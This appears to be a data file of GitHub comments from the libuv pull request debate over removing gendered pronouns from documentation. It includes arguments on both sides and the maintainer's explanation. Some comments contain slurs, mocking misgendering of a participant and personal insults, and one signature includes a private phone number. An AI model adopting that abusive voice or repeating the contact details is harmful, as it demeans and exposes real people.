Glad to see it was resolved, going back to coding. 
"
3403	"EDIT: the comment this in reply to has been deleted.

@ThiefMaster Ah, of course. How silly of me! I could be writing code (I do) or hanging out on websites (like this one) or drawing attention to issues (like I do every single day, including the issue of ""privilege talking down to unprivilege"" - not that I would know where to find an example of THAT). 

Please do not say that what people sincerely care about is ""political correctness."" It is tantamount to accusing them of lying. Please do not tell us that what we feel is important does not in fact matter and you know this because....?

Everyone supports feminists, as long as they're being feminist somewhere ELSE. 
"
3404	"Can people please stop recommending 'alternative' causes, as if they have to be mutually exclusive? Advancement is exactly that, no matter how big or small a step it is, or how effective you personally deem it to be.
"
3405	"Thank you @isaacs :)
"
3406	"@ThiefMaster

> I'm a guy and wouldn't mind the female version being the default.

Wow, good for you, but the experiences of men and women in tech are not symmetric!  Women make up only 1.5% of contributors to open source.  It's hard for the other 98.5% to understand what that's like, without putting some serious effort into listening and empathy.

> in some languages it results into REALLY ugly perversions (German: …)

Cool, let's revisit that when `libuv` switches all the documentation to German, which I'm sure will happen any day now.

> And all women who rather waste time on issues like this one:

Actually this PR was opened by a man, and most of the comments in favor are from men as well.  The thing is, men in tech aren't expected to prove ourselves ""actually useful"" every time we speak in public.  Consider the bias you show by directing your ""make yourself actually useful"" comment at the few women participating in this conversation.
"
3407	"»in some languages it results into REALLY ugly perversions (German: …)«

I am a German native speaker and can only answer as follows:

If you put just the same effort and care into writing of your documentation like you already did to your code it is possible to produce readable text which is not even close to any kind of »ugly perversions« mentioned here.
"
3408	"Harassing and bullying at its highest form. Yet it is for the ""good fight"". I need to get off this planet.
"
3409	"For those interested in improving their technical writing skills, here are some [style guidelines](https://www.e-education.psu.edu/styleforstudents/c1_p15.html) from Penn State. Avoiding gendered pronouns is number 3.
"
3410	"Honestly, seeing the gendered pronoun looked weird and unprofessional to me... regardless of any so-called ""political"" ramifications...
"
3411	"+1 merge this. ""Not interested in trivial changes"" is the wrong approach. Why not agree to making something better if _one_ has already done the work for you?
"
3412	"It doesn't make sense to use gendered pronouns unless you're specifically addressing a single gender. ""Trivial"" or not, it's not a big deal to accept the pull request.
"
3413	"Shut the fuck up.
"
3414	"Thanks to @alex for submitting the PR in the first place, and thanks to @isaacs and everyone who commented on wanting to see this merged.

I believe these kinds of things _do_ make a difference. Same for speakers, presenters, organisers etc. at events making an effort to e.g. switch between gendered pronouns (because yes, for many this is indeed still an effort, and probably even more so for non-native speakers of English, who are often not so aware of the finer points of the language or ""accepted"" alternative ways to express things). I'm always happy when someone does this! 

@jorgenschaefer basically summed up the issue of/with this thread perfectly.
"
3415	"Are you people mad? (some of you)

It is a witch hunt, I'm surprised you didn't yet start to shout that non-believer should be burned to death.

You act like clueless teenagers that strongly believe that nobody understands them and even more then that - all world is surely working against them too.

The original poster disregarded some major rules in a contributor guideline. He signed no CLA, he didn't specify which module his changes affect.

Then you started shouting that ""just merge this patch already"" and some of you even ""it's pointless to having to sing of every patch"".

Wow, so... Not only we have a non-conforming PR, but also you want to push it through without a due contributing process. Just because it's a politically correct thing to do.

Also, I've looked through commit history just now - I honestly couldn't find more commits with changes trivial like this one (implementation-wise).

So when bnoordhuis says ""Sorry, not interested in trivial changes like that."" I believe that he has good intentions - he doesn't want to create unnecessary noise in this repository.

And mind that bnoordhuis said one thing in this topic - one thing. And there at least 10 experts of psychology that claim to understand why he did it and why it makes him a douche.

IMO, if you want to help - influence contributing guide. If guide will state that documentation style should be ""passive and avoiding pronouns"" then no PR including gender-flavoured documentation will ever get through. All the benefits and word ""gender"" won't have to even be mentioned!
"
3416	"@kamiltrebunia if you have read the whole history, you would see that _before_ @bnoordhuis answered anything on this thread, @alex signed the CLA and asked for suggestions on saying which modules this changes affect. A pull-request is, first-and-foremost, a request for initiating discussion about an issue. Yet, @bnoordhuis did not engage into any sort of discussion. The comments that followed are regarding the form this PR was handled, and a larger social issue where actively preventing people from contributing to FLOSS is the default.

However, this doesn't make @bnoordhuis a douche, as he did not explain the reasons by which he rejected this PR, even though the lack of a discussion on the issue is in itself something I would consider a large issue in FLOSS. Now, this: https://github.com/joyent/libuv/commit/804d40ee14dc0f82c482dcc8d1c41c14333fcb48 could make them a douche.
"
3417	"@kamiltrebunia It's not a witch hunt; it was a very, very simple PR addressing a very, very simple problem with the wording of the docs. Trivial, yes. But the off-hand way it got dismissed — and more to the point, the subsequent discussion and behaviour here has made this very much a ""poster child"" for one of the big problems in the industry (misogyny, if that wasn't crystal clear by now).

This has gotten to the point that the _only_ acceptable behaviour is to accept the PR, regardless of ""due process"" issues. Much worse, as the behaviour of @bnoordhuis shows in 804d40e this is nothing about due process but about him making a stance against that thing you called ""political correctness"".
"
3418	"+1 for merging this.
"
3419	"> So when bnoordhuis says ""Sorry, not interested in trivial changes like that."" I believe that he has good intentions - he doesn't want to create unnecessary noise in this repository.

Unnecessary noise like 804d40e?
"
3420	"- I have read the whole story.
- I believe that documentation style is unprofessional (simply because of the use of pronouns).
- I believe that we should be gender-neutral there, for the sake of gender equality.
- ""Political correctness"" is a good thing, but can also be abused and I believe that using it as a leverage to skip contributing process is such abuse.
- I respect every contributor to this discussion that had legitimate arguments - I was referring people that were pushy.

But most of all:
1. The only real solution here is to ask **future contributors** not to do that. Asking to merge this very PR is almost meaningless.
2. The only way to enforce that is by putting it into Contributing Guidelines.
3. If such thing would land in a Guide, then those little ""mistakes"" in current docs would be meaningless and also, at some point would be just gone (along some refactoring).

So my stance is: Let's make sure that unprofessional wording (pronouns where they don't belong) in documentation doesn't get through PRs in the future and this PR that we are discussing right now - I don't care.

No noise in commit history and big win for ""White Knights"" ;-) // sorry for a little sarcasm!
"
3421	"A small point: in addition to alienating women, using ""he"" as a generic pronoun also alienates non-binary and agender people (many of whom use ""they"" as their personal pronoun, because it is a neutral singular).
"
3422	"![title]()
"
3423	"+1 for merge
"
3424	"I preferred the Dijkstra option of removing the anthropomorphism altogether :-(
"
3425	"@kamiltrebunia:

> ""Political correctness"" is a good thing, but can also be abused and I believe that using it as a leverage to skip contributing process is such abuse.

Agreed, but this has gone beyond whether or not that was happening. The issue now is: how do the maintainers of this project and @joyent come across in the larger issue of women in tech. This issue is now a simple test of that issue. Like @leafstorm mentioned, the motivation isn't an excuse to not do the right thing. And going out of one's way to stick with the wrong thing (804d40e) is asinine behaviour.

As for your suggestion about contributing guidelines, I couldn't agree more.
"
3426	"@nelsonmenezes Isaacs has already landed the patch. @bnoordhuis is not a Joyent employee, but rather a StrongLoop employee.
"
3427	"To everyone that thinks this is trivial... it is. It is absolutely trivial to fix and not get wrong again. That even one person had to comment on it to try to get the PR accepted, let alone this many people, is crazy.
"
3428	"@kamiltrebunia you are a doggone hero (https://github.com/joyent/libuv/pull/1015#issuecomment-29553633)

@jjt I honestly think everyone in this thread wants to encourage more women into STEM fields, and technology in specific, so that's not even at stake, IMO. My whole point is that this PR will not change the sexists or chauvinists. It will not make a young woman feel less intimidated going into a computer science lecture hall with 200 young men. You could literally s/(he | she)/they s/(him | her)/them through all the github docs repos and still have a marginal or negligible impact on the issue. The tough issues are reaching out and supporting women early, before college ideally. Making a case for STEM fields and the possibilities. Help/encourage local women groups or help fund those grassroots groups already making an impact on the issue. Influence/vote your local school board for a stronger STEM curriculum and funding (investment of your sales/property tax dollars, dammit). Groups to help support/document pay disparity claims. Make sure the community keeps self policing -- remember how the community responded to that sexist Halloween event in the Bay Area? Those things _DO_ have direct and material impact and well worth the time and energy invested. And if you don't have the time or know how to do those things: donate to those who know and can do it. But evidently I'm in the minority here in terms of how the community should address the grander issue of women in tech, and I guess that's fine too.

Also for those saying in the social media what a disaster/train wreck this thread is: you should not be so quick to dismiss the **passionate** (although often uncivil and/or cynic) discussion about a very (perhaps the most?) important issue facing our field. A train wreck would be not to discuss it at all or the censoring of opinions.
"
3429	"@rdodev I think that most people would agree that it would make a larger difference to actually get out there and support girls and women at all stages of development. But every little bit of positive change helps, as it's [death by 1000 paper cuts](http://juliepagano.tumblr.com/post/46206589124/my-experiences-in-tech-death-by-1000-paper-cuts) for the marginalized.

Maybe it was just the tone of your comment - instead of just lashing out at this thread, I think you would have better affected your aims by saying something like ""This is all well and good, but the larger issue..."". It's the same as if you were to say ""Good, I'm glad that they didn't bother donating that $5 to charity. Everyone should donate at least $100 if they want to make a _real_ difference.""

Every dollar counts.
"
3430	"@jjt ""Maybe it was just the tone of your comment"" I agree. I'm painfully aware and in retrospect, regret that I sabotaged my own intentions by ""coming out swinging.""
"
3431	"@rdodev I think we've all been there!
"
3432	"I must say that the conversation here is super encouraging, at least.
Thanks all for considering this an issue we can all take part in changing.

Sara J Chipps
862.201.3065

_Blog_
http://SaraJChipps.com http://sarajchipps.com/

_Projects_
http://GirlDevelopIt.com http://girldevelopit.com/
http://Levo.com http://levoleague.com/
http://ElizabethandClarke.com http://elizabethandclarke.com/

---

No trees were killed in sending this message but a large number of
electrons were terribly inconvenienced.

On Sat, Nov 30, 2013 at 4:06 PM, Jason Trill notifications@github.comwrote:

> @rdodev https://github.com/rdodev I think we've all been there!
> 
> —
> Reply to this email directly or view it on GitHubhttps://github.com/joyent/libuv/pull/1015#issuecomment-29561029
> .
"
3433	"My question for Joyent, @isaacs, et al: would you consider updating your CONTRIBUTING.md to clarify the types of contributions that are sought for your open source projects?
"
3434	"@jden I think that might be ""too trivial"" of a change for bnoordhuis.
"
3435	"Jesus Christ, it's just a single line change.

What's the big deal over such an edit? It makes _zero_ functional difference to the underlying program anyhow.

I can see people getting antsy over the entire feminist issue, but come on, this is beyond trivial.
"
3436	"Just to prevent late-comers from being confused about the current state of affairs: The change was merged, the reverting was undone, and [joyent responded](http://www.joyent.com/blog/the-power-of-a-pronoun). I'm really happy to see so many people support even small changes towards more diversity. :-)
"
3437	":+1: for better grammar in docs, not everybody has to contribute in code
"
3438	"We've added a contribution guide (which was long overdue anyway) that includes a policy about this.
See https://github.com/joyent/libuv/commit/39db22594df13e8423af3e923ec15b8dc47a5234#diff-6a3371457528722a734f3c51d9238c13R78
"
3439	"Hi,

This is coming from an outsider to Node - this whole fiasco, and the subsequent posts on Joyents blogs, and the Strangeloop blogs, and threats of ""firing"" somebody make the Node.JS community look really...juvenile and reactionary.

I'm sorry, but this entire thing has blown way out of proportion.

And people who add zero to the discussion, are simply chiming in and slagging people, or getting involved in some silly witchhunt just so they can claim their ""I SUPPORT WOMEN"" stickers as well.

Ben has said very little on the subject, and quite frankly, that makes him come across as a lot classier. As I said, I'm an outside, and perhaps I lack context, and apparently he's done other stuff, but based on this alone, he comes out on top.

I just asked my wife (who's not in CS) what she thought of female/male pronouns, and her response was literally ""Meh"". Most of the surgery journals she reads though just use non-gender terms.

Her next comment though - ""Hey, you did electrical right? What about those plugs - they're male/female, right? Just because it has a pokey-out bit. That was so thought up by a guy..."".

I didn't know what to say to that.

Reminds me of that whole ""dongle"" fiasco a few months ago...

Seriously guys, there are way better fights we can be fighting. I remember my computer engineering class had like four girls our of over a hundred. I don't know if we made them feel unwelcome - I'd hope we didn't. But I'd be more worried about general douche behaviour, or lewd jokes/remarks in engineering, as opposed to what pronoun you used - sure, make sure your writing doesn't use it, but to go around trying to change all of them...?

Cheers,
Victor
"
3440	"> And people who add zero to the discussion, are simply chiming in and slagging people, or getting involved in some silly witchhunt just so they can claim their ""I SUPPORT WOMEN"" stickers as well.

And you now feel you’re adding something to the discussion. Is that it?
- Look, this was hugely blown out of proportion. I think we can all appreciate that. Yes, it definitely should have been changed immediately and without four dozen comments. Yes, it is actually kind of an important change, reluctant as some people are to believe it: like you said, “most of the surgery journals she reads though just use non-gender terms”. It’s the same in this line of work, too, and the gendered pronouns kind of ring false. May as well change it as a matter of style. Which it is.
- Your ‘“I SUPPORT WOMEN” sticker’ thing is obnoxious, please never do that.

… sorry for continuing the chain, by the way. E-mail would work better.
"
3441	"Are those stickers for sale? Can I have one tech-themed?
"
3442	"> This is coming from an outsider to Node - this whole fiasco, and the subsequent posts on Joyents blogs, and the Strangeloop blogs, and threats of ""firing"" somebody make the Node.JS community look really...juvenile and reactionary.

Joyent is showing a mature response and setting a higher standard for documentation and participation in their projects. What _is_ juvenile and reactionary is claiming that holding to that higher standard is merely an attempt to score brownie points with women.

> Seriously guys, there are way better fights we can be fighting. I remember my computer engineering class had like four girls our of over a hundred. I don't know if we made them feel unwelcome - I'd hope we didn't. But I'd be more worried about general douche behaviour, or lewd jokes/remarks in engineering, as opposed to what pronoun you used - sure, make sure your writing doesn't use it, but to go around trying to change all of them...?

Better fights than fighting for gender equality and making the software projects that run our world inclusive spaces? Oppression is subtle and systemic, and even if you don't tell lewd jokes, gendered assumptions betray your position on who you think will use your software. 

I can't say for certain that there aren't people looking for gendered documentation just incite conversations that you think are juvenile, but I'm inclined to apply Occam's razor to this one and assume the OP was going through the code base, noticed the poor style and submitted a pull-request.
"
3443	"Hi all, let me try to clear up a few things.

Why I rejected the pull request.  Us maintainers tend to reject tiny doc changes because they're often more trouble than they're worth.  You have to collect and check the CLA, it makes `git blame` less effective, etc.

That's why the usual approach to such pull requests is 'no, unless' - in this case the 'unless' should probably have applied.  To me as a non-native speaker, the difference between 'him' and 'them' seems academic but hey, if it gets us scores of female contributors, who am I to object?

Why I reverted the commit.  In hindsight, I should have given Isaac the benefit of the doubt because I don't doubt that he acted with the best of intentions.  On the other hand, if another committer jumped the line like that, I would have done the same thing.  We have procedures in place and no one is exempt from them.

To the people that felt it necessary to call me a misogynist: I volunteer in a mentorship program that gets young people - especially young women - involved in technology.  How many of you go out and actively try to increase the number of women in the field?

I'm probably going to step back from libuv and node.js core development.  I do it more out a sense of duty than anything else.  If this is what I have to deal with, then I'd just as rather do something else.  Hope that clears things up.  Thanks.
"
3444	"Hi,

@jteneycke Sorry, but threatening to ""fire"" somebody in public, who doesn't even work for you - is not a ""mature"" response. Nor is calling somebody an a*sehole on a public company blog. (I'm not saying you said those things).

This is what I feel is juvenile and reactionary. Perhaps there was context or some inside joke that an outsider missed, however, it didn't come across as very ""nice"".

You don't see people like Guido van Rossum or Rob Pike joke about ""firing"" somebody from Dropbox/Google, or calling them names on their company blog.

You can argue that this is my opinion - but I don't think this was something that needed to be aired out in public.

It's strange that Joyent talks about how small words are important, then throws around words like ""fired"" with such wild abandon.

This seems like a misunderstanding about process that could have been sorted out in private, without a witch-hunt, or people getting upset and worked up.

Cheers,
Victor
"
3445	"> It's strange that Joyent talks about how small words are important, then throws around words like ""fired"" with such wild abandon.

I would say that's comparing apples to oranges. ""Fired"" isn't a gendered word that has larger social ramifications that careless use of pronouns does.

From the Geek Feminism Wiki under the topic of [Witch Hunt](http://geekfeminism.wikia.com/wiki/Witch_hunt)

> Critics of sexism are sometimes accused of launching a witch hunt or demonizing a man, or similar.
> There seem to be a couple of inputs into this:
> - a (generally false) perception that a man described as having done something sexist is at serious risk of losing his career, family or community standing
> - a perception that accusations of sexism should be reserved for very serious incidents only
> 
> the tendency of both critics and defenders of sexism to see the other side as having spilled more words in an individual debate, thus leading to an exponential growth in responses and counter-responses. Defenders who perceive this as entirely due to the critics will tend to then accuse them of having responded disproportionately to the original incident, even when the response is due to both an incident and to defenses of it. 

I don't think fearing the mention of someone being fired from a company that doesn't employ them is more important than having a conversation about language standards on the project and setting an example for the community. It's easy to call Witch Hunt every time you see people reacting in unison on the internet, but I think your label is perhaps misplaced. [Let’s create environments where it’s safer to be a feminist than it is to be a misogynist.](https://medium.com/ladybits-on-medium/c403f8259cbf)  
"
3446	"I feel for you, @bnoordhuis - in many languages, for a start, the masculine form of the word is used when the gender of the person/people is not known. I know English isn't necessarily the same, but people should really calm down. One word will NOT make any difference. There are people claiming it's good to start small with these things, and I agree that can be good. But this isn't even starting small, it's just stupid.
Sure, like others have said, it might be an idea to suggest using genderless pronouns in the future, but quite frankly I don't know any woman who would be offended by the use of 'he' meant in a general sense. It's just such a small and stupid thing to waste time on.

The fact that Joyent responded in the way they did to this fills me with disgust - I'm all for equality, in Computer Science as well as the rest of the world, but this witch-hunting is only going to scare people away. For a start, I've decided I would never want to work for Joyent. Those comments about firing someone for this are just horrible.

Also, perhaps more importantly, I read a comment by a girl in the industry who claimed seeing things like this makes her afraid that guys in the workplace will think she's going to act in such a strict extreme manner (and get them into trouble over nothing). Whether or not she's right that men will think that doesn't matter - the important thing is that it's putting her off! Wouldn't it be better if we just treated both men and woman normally and with friendliness so everyone can feel comfortable in our jobs?

If anything, behaviour like this and making such a big deal of it is going to have a negative impact on any woman who wants to get into the industry without being a flaming extremist feminist.
I honestly feel bad for our industry and would like to apologise to any 'normal' woman on behalf of the crazy people commenting on this PR thinking that changing this one word will get you interested in computing.
"
3447	"Wow. That's it? A grammar mistake? A maintainer not wanting to merge a fix? 80 people discussing this? Wow.

I came here because this article was linked as being a sign of what's wrong with our society / FLOSS / etc. I'll leave here, bewildered about people's inclination to get involved with... nothing.

We've had highly critical bugs in Oracle that made us restart a banking system once a day for half a year before we got a patch from Oracle. OK, it was a pain, and OK we were all cynical about Oracle as a software vendor. But we found a workaround. Our live went on. ""Him"" or ""Them"" or ""They"" or ""One""... that's it?? That's why you made me come here? ;-)
"
3448	"Most retarded merge request in history. Would reject / 10.

#mistydemeo: ""Speaking as a woman...""
As a w-w-w-what? Excuse me? I mean, I did spend like 10 minutes staring at the picture to figure things out, but all I'm left is some creepy feeling that why did I stare at a man's picture for 10 minutes. All this effort and I'm left confused, xir.

#winocm: Imagine you have your own project, and you are so kind, that you make it available for everyone on Github. And then people waste their time (besides Facebook) with this. You have to review these silly things, and it's not even that simple sometimes to merge a change. Especially if it's this retarded.

I bet if Microsoft would open their code for some project, thousands of requests/articles would born because of their feminine/masculine wording of variables, comments, functions and whatnot.
Oh just wait 'til I find a ""she"" or ""her"" in a documentation.

We should all just call Github the new Tumblr. It's anything but a professional collaboration platform for open-source projects. Sure it did start out that way, but now it's just a place for people to joke around. (See this request/comments.)
And then people defend open-source. Open source: not even once.

PS.: I couldn't find a single woman supporting this bs here, but please help me spot them. I mean, some omega internet white knight made the request, and a woman here commented that this is totally fine...
"
3449	"It's ironic that for the first ~90 comments here not one person proposed a big picture solution, which is putting this rule into Contributing Guideline and at the same time same people shouted that it's @bnoordhuis who can't see some other big picture (obviously that was also the case).

It's also ironic that this idea for improving Guideline first came from a guy who wants nothing to do with you, because you scare him (as a group), even though he thinks you are right in your claims.

(https://github.com/joyent/libuv/pull/1015#issuecomment-29553633)

Don't be fanboys of gender-neutrality - that's not helpful.

We've got our gender-neutral doc, but we've lost core contributor in the process.
(http://strongloop.com/strongblog/collaboration-not-derision-in-the-node-community/)

Does that sound like a victory?

Are you absolutely sure that we couldn't **eat the cake and have it**, if we acted differently - more peacefully?

It was a witch burning whether you like they idea of **you** being bullies or not. Two wrongs don't make right.

On the other hand lack of communication from maintainers (=== ignoring people) was the actual trigger for this mess, so maintainers kind of brought it onto themselves. They learned their lesson thought. I wonder if the other side learned a bit too.

P.S
http://global3.memecdn.com/Why-are-there-so-few-girl-engineers_o_27729.jpg
"
3450	"> if it gets us scores of female contributors, who am I to object?

@bnoordhuis I don't think it will, but I also don't think that was the primary goal. I'd argue that it was to raise awareness and to be more inclusive in our future activities. Often we are exclusive without even realizing it.

It's certainly opened my eyes. It's a trivial change, but a step in the right direction. I've since grepped for gendered pronouns in some documentation that I wrote and found a few cases that I can and will improve.

Being a core contributor and maintainer to important Node projects, you have lots of important decisions to make on a daily basis. Sometimes we don't make the best decisions, that's okay, we can always go back and fix it. People are grateful for the work and time that you've put in. Angry internet mobs can be scary, but try not to let them discourage you.

I think one thing we can all take away from this is that procedures should be seen as guidelines, not rules (unless you're working on mission/life/safety-critical systems).
"
3451	"I feel offended.
"
3452	"Please fix it.
"
3453	"> Most retarded merge request in history. Would reject / 10.
> 
> #mistydemeo: ""Speaking as a woman...""
> As a w-w-w-what? Excuse me? I mean, I did spend like 10 minutes staring at the picture to figure things out, but all I'm left is some creepy feeling that why did I stare at a man's picture for 10 minutes. All this effort and I'm left confused, xir.

Thank you for providing a perfect example of why accepting such pull requests is good, and rejecting them is bad.

When I come across documentation with non-gendered pronouns, I think to myself ""oh, nice, someone's thinking of social minority groups, these people are likely nice in general"". When I come across gendered pronouns, I think to myself ""oh, uh, I hope that's just an oversight and this project is not full of creepy douchebags like the above.""

_Rejecting_ such pull requests gives a strong impression to possible contributors that, indeed, the project is likely full of creepy people like that.

Which, incidentally, has nothing at all to do with ""pleasing women"" specifically. It simply gives a first impression of your project.
"
3454	"@jorgenschaefer Personally I am very offended by comments like yours. The fact that you'll imply that people are 'creepy douchebags' just for not using the words you would like... Well, that's worse than someone using the word 'he'.
The fact is, I've yet to meet a single woman who is offended by the use of 'he' in a way like that, or any who would take it as any indication of the state of the project. But the way everyone is speaking of bnoordhuis and other people is very obviously intended to be offensive. How are you making the situation any better?

Most of the people in this thread of comments are being very offensive, and I believe fail to see this in themselves. It makes me feel uncomfortable because certain people (who have done more good than all of you moaners) are seen as bad people just because they aren't agreeing with the majority here.

This is the first time I've EVER in my whole life thought FOSS can be a bad thing. It's a real shame, but if people are going to treat a developer like this over a god damn word in some documentation, people will just stop letting people see any of their source code.
"
3455	"@SharkofMirkwood, you misunderstood. I noted (not implied) that the person is a ""creepy douchebag"" for responding to a woman by telling her they didn't like her cover photo and that she supposedly does not look like a woman. Which is creepy to hell.

I hope that clarifies that. :-)
"
3456	"I think we can count this day as a win for feminism.
"
3457	"@jorgenschaefer Ah right, yeah I see that now - sorry for the misunderstanding. I still maintain that that's my general feeling towards this whole discussion though - the 'attack' made on bnoordhuis went way out of control and caused a lot more harm than a gendered pronoun could.

I think it's fair enough for the pronoun to be pointed out, and to suggest that someone changes it (even making the PR is okay), however it should have stopped there. Even if it wasn't merged, that would be fine, and I do see the reasons for the revert so I don't disagree with that. But essentially, everyone getting mad over it is despicable. I think if things simply stopped after the pull request was rejected, even the developer who rejected it would've thought about using a gender-free pronoun next time, so wouldn't that have been a 'win' for everyone?
Again, I agree that women should be made to feel comfortable working in this industry, but at the expense of someone else's willingness to work? And over such a small thing? I think something like this should never happen again.
"
3458	"84 commenters discussing the [bikeshed](http://blog.jooq.org/2013/12/01/the-open-source-bikeshed/), and counting.
"
3459	"So let me get this straight, Bryan Cantrill would fire someone over a gendered pronoun?

Wow! Check what he's famous for writing (scroll to the bottom):

http://cryptnet.net/mirrors/texts/kissedagirl.html
"
3460	"@Tg8igPGjh3 WTF?
@SharkofMirkwood: You have understood nothing.
"
3461	"@victorhooi 
@winocm 
- Scholarworks: [When ""He"" Doesn’t Mean You: Gender-exclusive Language As Ostracism](http://scholarworks.umass.edu/cgi/viewcontent.cgi?article=1288&context=theses)
- Jstor: [Is the Generic Pronoun ""He"" Still Comprehended as Excluding Women?](http://www.jstor.org/discover/10.2307/27784423?uid=3738032&uid=2&uid=4&sid=21101158651347)
- Jstor: [""Penguins Don't Care, But Women Do: A Social Identity Analysis of a Whorfian Problem](http://www.jstor.org/discover/10.2307/4168079?uid=3738032&uid=2&uid=4&sid=21101206054217)
- Stanford: [Generic pronouns and sexist language: The oxymoronic character of masculine generics](http://www.stanford.edu/class/linguist156/Gastil_1990.pdf)

@victorhooi 
Your wife, unfortunately, is wrong.

Your categorization of this fight as ""unimportant"" neglects the facts that:

a) not only do ""generic"" masculines push women away from CS (or any area in which they are used), but they contribute to a larger culture of sexism.
b) this fight is also about getting men to change their attitude towards sexism -- getting men to understand and empathize with people who have an often wholly different experience of the world (because of patriarchy) than them.

This fight, and others like it, needs to fought in tandem with efforts to get more women involved with CS in the first place. It's no use _just_ increasing the number of women who start a CS career, not when a large percentage of them leave for greener fields after 5 or 10 years. Entrance and retention rates are both important.
"
3462	"> ""generic"" masculines push women away from CS (or any area in which they are used)

I think that's major BS. If someone is truly interested in the subject she will surely not decide to do something else because of something like this.
"
3463	"This whole discussion is just retarded and I regret saying anything now.
Yes, if women want to study CompSci or Engineering they can do so, and personally I'll welcome it. But frankly, anyone who gets so upset by a matter like this (which wasn't even intentional in the first place) can piss off, be they woman or man or whatever else.

Good luck with your crusade of political correctness in literature or whatever it is you're up to.
"
3464	"@ThiefMaster

> I think that's major BS. If someone is truly interested in the subject she will surely not decide to do something else because of something like this.

Go and read the plentiful science on the subject I've posted. I doubt you have, since you commented just 3 minutes after I posted mine. If those four links aren't enough I'm absolutely sure you can find some more on Google scholar. You might also try searching for ""the effects of stereotypes"".

Someone who's truly interested in entering the subject may very well not be deterred because of this, I'm living proof. It will, on the other hand, have a much larger effect (in the aggregate) on more marginal cases.
"
3465	"Unlike e.g. math this kind of ""science"" is nothing where there's a perfect truth. So who says those ""scientists"" were right and the GIRLS who have no problems with this stuff (and even make dick jokes etc. themselves) are wrong?! But you are right, I did not read those articles.
"
3466	"There is nothing ""wrong"" with writing documentation that includes a male pronoun. People should feel encouraged to continue to share their contributions to open source without feeling intimidated that their work might not be politically correct. We need to remember English is not a native language for many contributors.

One is not a misogynist simply on the basis of using a male pronoun to describe a generic user.

Such a practice should be considered a ""bug"", however, since users are neither exclusively male, nor female. 

When a contributor reviews documentation and issues a PR to fix gender-specific pronoun bugs, that person should also not be made to feel intimidated or like they have to defend their contribution as a political point of view.

You are not a ""pushy feminist"" if you understand the value of correct grammar. 

The patch should have been accepted.

Those who are pushing in either direction, consider Newton's Third Law of Motion: 

```
Law III: To every action there is always an equal and opposite reaction: 
    or the forces of two bodies on each other are always equal and are directed in opposite directions.
```

Many of the arguments, above, are not constructive. There is no call to action made or way for everyone to move forward together. All that is created is more hostility and someone with the opposite point of view feels inclined to respond and the cycle of action and reaction continues, just like Newton described.

This particular grammatical fix is not critical, as was correctly pointed out many times, above. What is worth noting, however, is the damage caused to the broader community when people act in a hostile, uncooperative manner. That cooperation is supposed to be a hallmark of who we are as an open source community.

There is no reason to believe that accepting the patch will have any significant, positive impact on diversity. It is a PR that fixed a writing bug and there is absolutely no good reason for not accepting this fix.  It's nothing more or less than that.
"
3467	"@Alyxr 

> b) this fight is also about getting men to change their attitude towards sexism -- getting men to understand and empathize with people who have an often wholly different experience of the world (because of patriarchy) than them.

kind of strange being lectured by someone who has an avatar promoting Mao about the signifcance of him/her and the importance of empathy. I guess the millions of people murdered under Mao's regime and those that lost family to that butcher are not people that deserve empathy.
"
3468	"@JillHerrera and Stalin and Lenin. Yup, the empathy crew right there. Talk about Pontification.

@bnoordhuis **""I'm probably going to step back from libuv and node.js core development.""** this is very damn sad. Because this shows how myopic the white knights are and the damage they cause when they blindly rally against someone without knowing all the facts or all the angles. There were a ton ""this is what's wrong with tech"" twits about this thread last couple of days. That's mildly infuriating, to be honest. Because first and foremost assumes the intent of both the docs and the initial PR denial are malicious and misogynist when none is really present. You want to know what's really wrong in tech? This mindless witch-hunt trying to put undue pressure on people and get people fired. That's bullying and it's reprehensible. 

**""To the people that felt it necessary to call me a misogynist: I volunteer in a mentorship program that gets young people - especially young women - involved in technology. How many of you go out and actively try to increase the number of women in the field?""**

I'm willing to bet, only handful, if that many. You see, it's much easier to sit behind a computer and point fingers than it is to get actively involved in a worthy cause. (https://github.com/joyent/libuv/pull/1015#issuecomment-29560484)
"
3469	"> I'm probably going to step back from libuv and node.js core development. I do it more out a sense of duty than anything else. If this is what I have to deal with, then I'd just as rather do something else. Hope that clears things up. Thanks.

@bnoordhuis: Closing the pull request isn't the reason you have this mob to deal with. If what you really cared about in this instance was process, you had ample opportunity to contact @isaacs to privately ""chide"" him instead of making the public performance you decided on. What you wanted here was a little power trip instead of doing the right thing.
"
3470	"@davidcelis no, that's just plain incorrect. His witch-hunt was all ABOUT the PR denial and subsequent revert. Whatever politics in the subsequent ""chiding"" has nothing to do with the white knights and pitchforks. Don't try to change the tune now.
"
3471	"And yet if, instead of reverting the commit, he had contacted @isaacs in private to tell him to follow process, this wouldn't be happening. The force-pushed revert is what really got the publicity here. If you think otherwise, you're kidding yourself. Also, you really need to look up the definition of white knighting.
"
3472	"@davidcelis I'm not even arguing that the public chide was likely more fuel to the fire. What I'm trying to say is that the fire was already in full rage when that happened. The **core** issue here was the white knights rallying against ""hostile"" gendered pronouns. 
"
3473	"> witch-hunt
> 
> white knights

I'm trying SO hard to set you on fire with my mind right now.
"
3474	"@jesusabdullah sorry, is not working. Still haven't ignited. Will ping you if I do.
"
3475	"At least is clear Ryan made the right decision when he decided to abandon core node development; you guys are poisonous.
"
3476	"@Ivanca : Please. The correct term is ""people"". Not ""guys"". ;-)
"
3477	"@ivanca it is sad talented developers are avoiding certain projects because precisely this sort of thing. It is poisonous and it hurts the community a million times more than a gendered noun in the documentation ever did.
"
3478	"> The core issue here was the white knights rallying against ""hostile"" gendered pronouns.

The core issue is in the title of this aptly-named Issue. It says “Removed use of gendered pronouns”. I also like the description:

> No description given.

’Cause it doesn’t need one. Or discussion. Or reverting. Or firing.

Fact of the matter is, @rdodev, the first poisonous comment in this entire overblown thread was yours:

> Glad this didn't go through. The White Knights of tech are getting a bit over their heads on this. One thing is to raise awareness of a problem that exists throughout society -- not just tech, a whole different one is to go to the extent of requesting a pull request to remove gendered references. That helps no one. Zero. It does not advance anyone's argument.
"
3479	"@rninty https://github.com/joyent/libuv/pull/1015#issuecomment-29537035 and https://github.com/joyent/libuv/pull/1015#issuecomment-29539667
"
3480	"Thanks, I took those into account already.
"
3481	"Wow, did every SJW (google it) come out of the woodwork on github for this?

I'm female. I don't rightly care - English defaults to male pronouns, and singular they, whilst an established usage, is grammatically dubious. He/she is also an awkward construction. Yes, English is sexist - most Indo-European languages are. It's the way it is, and all the whining in the world won't change thousands of years of established grammatical tradition, when the mere idea that women and men were equal only gained any serious currency in the past 30 years. (Note: I do believe the sexes are equal)

That said, I don't think I'd mind if this were accepted, but I'm not going to lose sleep because it hasn't been so far. I have more important things to worry about.

As an aside, I am well aware about whining about whining and how this makes me a hypocrite and part of the problem :P.

